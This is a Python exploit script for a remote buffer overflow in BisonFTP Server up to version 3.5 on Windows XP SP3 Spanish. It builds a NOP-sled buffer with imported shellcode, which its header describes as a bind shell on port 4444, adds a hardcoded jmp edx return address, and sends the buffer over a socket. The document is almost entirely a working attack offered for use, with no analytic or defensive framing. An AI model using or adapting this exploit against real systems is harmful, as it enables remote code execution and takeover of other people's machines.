#!/usr/bin/python
# BisonFTP Server <=v3.5 Remote Buffer Overflow Exploit
# Newer version's not tested, maybe vulnerable too
# written by localh0t
# Date: 10/08/11
# Contact: mattdch0@gmail.com
# Follow: @mattdch
# www.localh0t.com.ar | www.mfsec.com.ar
# Thanks to: Pr0zac, Irakirashia, Kchito
# Targets: Windows XP SP3 Spanish (No DEP) (Change as you wish)
# Shellcode: List shell on port 4444 (Change as you wish)

from socket import *
import sys, struct, os, time
import socket
import struct
from struct import pack
from payload import buf
def shell_attack(target_machine, target_port):
# connect to host
	sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((target_machine,target_port))
	sock.recv(1024)
	

	# padding
	buffer = b"\x90" * 1092

	# 368 bytes shellcode
	buffer += buf

	# more padding
	buffer += b"\x90" * 8

	# jmp edx (shell32.dll Windows XP SP3 Spanish) (edx points to the 1st nopsled)
	buffer += b"\x9a\x5c\x3c\x7e"

	# end connection
	buffer += b"\x0a"

	# send buffer
	
	sock.send(buffer)
	sock.recv(1024)
	sock.close()

	sys.exit()